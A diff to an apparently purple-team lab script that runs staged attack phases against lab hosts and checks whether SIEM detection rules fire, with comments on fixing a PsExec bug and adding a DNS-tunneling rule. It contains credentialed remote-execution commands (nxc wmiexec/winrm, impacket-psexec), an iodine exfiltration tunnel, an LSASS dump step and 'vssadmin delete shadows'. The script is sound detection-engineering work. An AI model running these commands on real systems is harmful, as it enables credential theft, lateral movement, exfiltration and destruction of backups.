@@ -80,13 +80,32 @@ run_attacks() {
   note "100525" "LSASS comsvcs MiniDump (T1003.001) — run credential-access/lsass-dump.ps1 on ws-01"
 
   phase "Phase 4 — Lateral Movement: WMI / WinRM / PsExec (T1047/T1021.006/T1569.002)"
+  # NOTE (2026-09-07, found re-running this phase for real): the original
+  # `for m in wmiexec winrm psexec; do nxc smb ... --exec-method "$m" ...`
+  # never actually attempted PsExec — this nxc version's --exec-method
+  # argparse choices for the smb protocol are {smbexec,atexec,mmcexec,wmiexec}
+  # only, "psexec" isn't one of them, so that iteration errored out of nxc
+  # itself (caught by `|| true`) before touching the wire. Same bug class as
+  # ad-validate.py's PsExec scenario had (see purple-team/README.md) — a test
+  # that looks like it ran because nothing crashed, but never fired a packet.
+  # Fixed: wmiexec/winrm go through nxc (winrm needs --local-auth for a local
+  # account, else it silently tries domain auth); PsExec goes through the real
+  # tool, impacket-psexec, since that's what actually attempts the technique.
   if have nxc && [ -n "$ADMIN_PW" ]; then
-    for m in wmiexec winrm psexec; do
-      step "nxc --exec-method $m -> ws-01"
-      nxc smb "$WS" -u "$ADMIN_USER" -p "$ADMIN_PW" --exec-method "$m" -x whoami >/dev/null 2>&1 || true
-    done
+    step "nxc --exec-method wmiexec -> ws-01"
+    nxc smb "$WS" -u "$ADMIN_USER" -p "$ADMIN_PW" --exec-method wmiexec -x whoami >/dev/null 2>&1 || true
+    step "nxc winrm --local-auth -> ws-01"
+    nxc winrm "$WS" -u "$ADMIN_USER" -p "$ADMIN_PW" --local-auth -x whoami >/dev/null 2>&1 || true
+    step "impacket-psexec -> ws-01 (expect: Defender quarantines the dropped service before it runs)"
+    have impacket-psexec && impacket-psexec -service-name PSEXESVC "$ADMIN_USER:$ADMIN_PW@$WS" whoami >/dev/null 2>&1 || true
   else skip "needs an admin cred on ws-01 (ADMIN_USER/ADMIN_PW)"; fi
-  note "100513" "PsExec/WMI/WinRM (Sigma 100513-100516)"
+  # Scorecard expects 100516 (WinRM), not 100513 (PsExec) — WinRM is the one
+  # of the three that's actually verified working end to end (2026-09-07);
+  # WMI (100515) is a genuinely open detection bug (attack succeeds, rule
+  # never fires — detection-catalog.md #39) and PsExec (100513/514) is
+  # confirmed Defender-blocked by design, same class as T1105/T1003.001
+  # comsvcs (detection-catalog.md #41) — neither belongs in a pass/fail gate.
+  note "100516" "WinRM lateral movement (T1021.006) — the verified-working path. WMI (100515) stays an open bug, PsExec (100513/514) is a confirmed-by-design Defender block; both deliberately excluded from this gate"
 
   phase "Phase 5 — Collection: stage data into an archive (T1560.001)"
   step "run '7z a stage.zip <data>' or Compress-Archive on ws-01"
@@ -94,7 +113,16 @@ run_attacks() {
 
   phase "Phase 6 — Exfiltration: DNS tunnel out to REDTEAM (T1048.003)"
   step "run an iodine tunnel fs-01 -> atk-01 (see phase-6-nsm/dns-tunneling.md)"
-  note "9100010" "DNS tunneling (Suricata 9100010); C2 beacon 9100002"
+  # GAP FOUND running this for real (2026-09-07): 9100010 is a Suricata sid,
+  # not a Wazuh rule id — Wazuh only ever surfaced this traffic through the
+  # generic threat-intel CDB rule (100210), and only because atk-01's IP
+  # happens to already be blocklisted from unrelated exercises. There was no
+  # labeled, MITRE-mapped Wazuh rule for DNS tunneling at all (unlike the web
+  # attack, which got one in 100440). Fixed with a new rule the same way:
+  # 100443, a child of the stock Suricata rule 86601 keyed on the "LAB DNS
+  # tunneling" signature text. Verified live: 60 pings through a real fs-01
+  # -> atk-01 tunnel fired it (firedtimes 100).
+  note "100443" "DNS tunneling (T1048.003/T1071.004, new rule 100443); C2 beacon 9100002 (not separately gated)"
 
   phase "Phase 7 — Impact: recovery inhibition + ransomware + malware drop (T1490/T1486)"
   step "vssadmin delete shadows /all /quiet  (on ws-01)"
@@ -132,10 +160,18 @@ if [ "${1:-}" = "--verify" ]; then
   # rebuild the expected list without launching attacks
   run_attacks() { :; }  # no-op guard (kept for symmetry)
   # populate EXPECT_RULES by tagging only
-  EXPECT_RULES=(100440 100100 100401 100031 100525 100513 100519 9100010 100520 100430 100460)
+  EXPECT_RULES=(100440 100100 100401 100031 100525 100516 100519 100443 100520 100430 100460)
   scorecard
   exit 0
 fi
 
 run_attacks
-scorecard
+# NOTE (2026-09-07, found running this phase for real): don't call scorecard()
+# here. This branch runs on atk-01, and REDTEAM never reaches SOC (by design —
+# docs/00-ip-plan.md), so every ssh-to-siem-01 check below would fail before
+# even comparing a rule id, printing a wall of MISSED that has nothing to do
+# with whether the attacks actually worked. That's not a "the lab failed"
+# signal, it's "you ran the score check from the wrong host" — worth saying
+# once here instead of making every future reader re-derive it from a fake 0/11.
+printf '\n  Attack phase done. Score it from the operator host (not atk-01):\n'
+printf '      ./run-scenario.sh --verify\n'
